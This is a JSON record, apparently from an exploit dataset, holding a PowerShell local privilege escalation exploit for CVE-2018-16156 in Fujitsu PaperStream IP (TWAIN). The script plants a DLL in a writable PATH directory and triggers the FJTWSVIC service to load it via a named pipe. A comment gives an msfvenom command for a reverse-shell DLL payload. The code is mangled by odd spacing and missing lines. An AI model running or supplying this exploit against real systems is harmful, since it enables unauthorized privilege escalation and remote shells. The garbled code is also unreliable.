{
    "text": "vul_name : PaperStream IP ( TWAIN ) 1.42.0.5685 Local Privilege Escalation ， vul_cve : CVE-2018-16156 ， vul_poc :  # Exploit Title : PaperStream IP ( TWAIN ) 1.42.0.5685 - Local Privilege Escalation ，  # Exploit Author : 1F98D ，  # Original Author : securifera ，  # Date : 12 May 2020 ，  # Vendor Hompage :  ，  # CVE : CVE-2018-16156 ，  # Tested on : Windows 10 x64 ，  # A DLL hijack vulnerability exists in the FJTWSVIC service running as part of ，  # the Fujitsu PaperStream IP ( TWAIN ) software package. This exploit searches ，  # for a writable location , copies the specified DLL to that location and then ，  # triggers the DLL load by sending a message to FJTWSVIC over the FjtwMkic_Fjicube_32 ，  # named pipe. ，  $ ErrorActionPreference = \"Stop\" ，  # Example payload generated as follows ，  # msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=eth0 LPORT=4444 ，  $ PayloadFile = \"C : \\Windows\\Temp\\UninOldIS.dll\" ， Write-Host \" $ PayloadFile not found , did you forget to upload it?\" ， Exit 1 ， } ，  # Find Writable Location ，  $ WritableDirectory = $ null ，  $ Path = ( Get-ItemProperty -Path \"Registry : HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\Environment\" -Name \"PATH\" ) .path ，  $ Path -Split \" ; \" | % { ，  [ IO.File ]  : OpenWrite ( \" $ _\\x.txt\" ) .close (  )  ， Remove-Item \" $ _\\x.txt\" ，  $ WritableDirectory = $ _ ， } catch {} ， } ， Write-Host \"No writable directories in PATH , FJTWSVIC is not exploitable\" ， Exit 1 ， } ， Write-Host \"Writable location found , copying payload to $ WritableDirectory\" ， Copy-Item \" $ PayloadFile\" \" $ WritableDirectory\\UninOldIS.dll\" ， Write-Host \"Payload copied , triggering.\" ，  $ client = New-Object System.IO.Pipes.NamedPipeClientStream ( \".\" , \"FjtwMkic_Fjicube_32\" ,  [ System.IO.Pipes.PipeDirection ]  : InOut ,  [ System.IO.Pipes.PipeOptions ]  : None ,  [ System.Security.Principal.TokenImpersonationLevel ]  : Impersonation )  ，  $ reader = $ null ，  $ writer = $ null ，  $ client.Connect (  )  ，  $ reader = New-Object System.IO.StreamReader (  $ client )  ，  $ writer = New-Object System.IO.StreamWriter (  $ client )  ，  $ writer.AutoFlush = $ true ，  $ writer.Write ( \"ChangeUninstallString\" )  ，  $ reader.ReadLine (  )  ， } finally { ，  $ client.Dispose (  )  ， } ， Write-Host \"Payload triggered\"",
    "time": "2021.01.07"
}